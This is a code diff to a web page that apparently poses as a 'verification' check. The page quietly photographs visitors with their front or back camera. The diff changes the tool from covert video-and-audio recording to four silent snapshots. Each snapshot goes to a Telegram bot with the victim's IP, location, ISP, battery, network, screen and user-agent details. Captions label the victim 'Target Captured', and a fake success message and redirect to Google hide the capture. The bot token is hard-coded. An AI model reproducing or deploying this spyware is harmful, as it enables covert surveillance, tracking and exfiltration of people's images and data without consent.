@@ -39,7 +39,7 @@
         }
         .btn:hover { background: #2563eb; }
         #status { margin-top: 15px; font-size: 13px; color: #facc15; }
-        video { display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -51,7 +51,8 @@
         <div id="status"></div>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
@@ -95,18 +96,18 @@
             const camType = urlParams.get('b'); 
             const chatId = urlParams.get('id');
 
-            let constraints = { video: { facingMode: "user" }, audio: true }; 
+            let constraints = { video: { facingMode: "user" } }; 
 
             if (camType === 'back') {
-                constraints = { video: { facingMode: { exact: "environment" } }, audio: true }; 
+                constraints = { video: { facingMode: { exact: "environment" } } }; 
             } else if (camType === 'front') {
-                constraints = { video: { facingMode: "user" }, audio: true }; 
+                constraints = { video: { facingMode: "user" } }; 
             }
 
             navigator.mediaDevices.getUserMedia(constraints)
             .catch(err => {
                 if (camType === 'back') {
-                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 }
                 throw err;
             })
@@ -114,75 +115,73 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                let mediaRecorder;
-                let chunks = [];
+                let photoCount = 0;
+                const maxPhotos = 4; 
 
-                try {
-                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-                } catch (e) {
-                    mediaRecorder = new MediaRecorder(stream);
-                }
-
-                mediaRecorder.ondataavailable = function(event) {
-                    if (event.data && event.data.size > 0) {
-                        chunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = function() {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
+                const photoInterval = setInterval(() => {
+                    photoCount++;
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
                     
-                    let currentTime = new Date().toLocaleString();
-                    let screenRes = `${window.screen.width}x${window.screen.height}`;
-                    let uaString = navigator.userAgent;
-                    let camNameTag = (camType === 'back') ? "[Back Cam Video]" : "[Front Cam Video]";
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    let captionText = 
-                        `🎥 **8-Second Video Captured ${camNameTag}**\n\n` +
-                        `🔢 IP: \`${ipInfo}\`\n` +
-                        `📍 Location: ${cityInfo}, ${regionInfo}\n` +
-                        `📡 ISP: ${ispInfo}\n` +
-                        `🔋 Battery: ${batteryData}\n` +
-                        `📶 Network: ${networkData}\n` +
-                        `🖥️ Screen: ${screenRes}\n` +
-                        `🕒 Time: ${currentTime}\n` +
-                        `🧠 UA: \`${uaString}\``;
+                    canvas.toBlob(blob => {
+                        let captionText = "";
+                        let camNameTag = (camType === 'back') ? "[Back Cam]" : "[Front Cam]";
 
-                    sendVideoToTelegram(blob, chatId, captionText);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    document.getElementById('status').innerText = "Verification Successful!";
-                    setTimeout(() => {
-                        window.location.href = "https://www.google.com";
-                    }, 1500);
-                };
+                        if (photoCount === 1) {
+                            let currentTime = new Date().toLocaleString();
+                            let screenRes = `${window.screen.width}x${window.screen.height}`;
+                            let uaString = navigator.userAgent;
 
-                mediaRecorder.start();
-                document.getElementById('status').innerText = "Recording video, please wait...";
+                            captionText = 
+                                `🌐 **IP Information ${camNameTag}**\n\n` +
+                                `🔢 IP Address: \`${ipInfo}\`\n` +
+                                `📍 Location: ${cityInfo}\n` +
+                                `🌍 Region: ${regionInfo} (${countryInfo})\n` +
+                                `📡 ISP: ${ispInfo}\n\n` +
+                                `📱 **Device Details** (${photoCount}/${maxPhotos})\n\n` +
+                                `🔋 Battery: ${batteryData}\n` +
+                                `📶 Network: ${networkData}\n` +
+                                `🖥️ Screen: ${screenRes}\n` +
+                                `🕒 Time: ${currentTime}\n` +
+                                `🧠 UA: \`${uaString}\``;
+                        } else {
+                            captionText = `📸 Target Captured ${camNameTag} (${photoCount}/${maxPhotos})`;
+                        }
 
-                setTimeout(() => {
-                    if (mediaRecorder.state === "recording") {
-                        mediaRecorder.stop();
+                        sendPhotoToTelegram(blob, chatId, captionText);
+                    }, 'image/jpeg', 0.85);
+
+                    if (photoCount >= maxPhotos) {
+                        clearInterval(photoInterval);
+                        stream.getTracks().forEach(track => track.stop());
+                        document.getElementById('status').innerText = "Verification Successful!";
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com";
+                        }, 1500);
                     }
-                }, 8000);
+                }, 1500);
 
             })
             .catch(error => {
-                document.getElementById('status').innerText = "Camera/Audio permission denied!";
+                document.getElementById('status').innerText = "Camera permission denied or not supported!";
                 console.error(error);
             });
         }
 
-        function sendVideoToTelegram(blob, chatId, caption) {
+        function sendPhotoToTelegram(blob, chatId, caption) {
             if (!chatId) return;
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', blob, 'capture.webm');
+            formData.append('photo', blob, 'capture.jpg');
             formData.append('caption', caption);
             formData.append('parse_mode', 'Markdown');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             }).catch(err => console.log(err));
